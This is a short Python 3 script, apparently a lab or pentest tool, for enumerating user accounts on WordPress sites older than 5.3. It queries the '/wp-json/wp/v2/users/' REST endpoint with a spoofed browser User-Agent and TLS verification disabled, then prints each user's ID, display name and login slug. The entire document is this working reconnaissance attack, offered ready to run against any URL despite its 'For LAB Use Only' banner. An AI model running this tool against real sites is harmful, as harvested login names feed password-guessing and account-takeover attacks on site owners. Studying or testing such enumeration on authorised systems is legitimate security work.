#!/usr/bin/python3
# -*- coding: utf-8 -*-

import sys
import requests
import json
import urllib3

def banner():
    print("""
- Wordpress < 5.3 - User Enumeration
- Version Python 3 (Arg Mode)
- For LAB Use Only
""")

def usage():
    print("Usage : ./extract_user <url>")
    print("Exemple : ./extract_user https://exemple.fr/")
    sys.exit(1)

def normalize(url):
    url = url.strip()

    if not url.startswith("http"):
        url = "http://" + url

    return url.rstrip("/") + "/wp-json/wp/v2/users/"

def enumerate_users(endpoint):
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }

        r = requests.get(
            endpoint,
            headers=headers,
            verify=False,
            timeout=5,
            allow_redirects=True
        )

        # Debug utile
        # print("URL finale :", r.url)
        # print("Status     :", r.status_code)
        # print("Contenu    :", r.text[:300])

        if r.status_code != 200:
            print(f"[!] Erreur HTTP : {r.status_code}")
            print(r.text)
            sys.exit(1)

        if not r.text.strip():
            print("[!] Réponse vide")
            sys.exit(1)

        content = r.json()
        show_users(content)

    except json.JSONDecodeError:
        print("[!] La réponse n'est pas du JSON valide")
        print(r.text)
        sys.exit(1)

    except Exception as e:
        print("[!] Erreur :", e)
        sys.exit(1)

def show_users(content):
    if not isinstance(content, list):
        print("[!] Format inattendu (pas une liste d'utilisateurs)")
        print(content)
        sys.exit(1)

    print("\n===== Utilisateurs trouvés =====\n")

    for user in content:
        print("------------------------------")
        print("[+] ID   :", user.get("id"))
        print("[+] Nom  :", user.get("name"))
        print("[+] User :", user.get("slug"))

    print("\n[✓] Terminé.")
    sys.exit(0)

if __name__ == "__main__":
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    banner()

    if len(sys.argv) != 2:
        usage()

    endpoint = normalize(sys.argv[1])
    enumerate_users(endpoint)
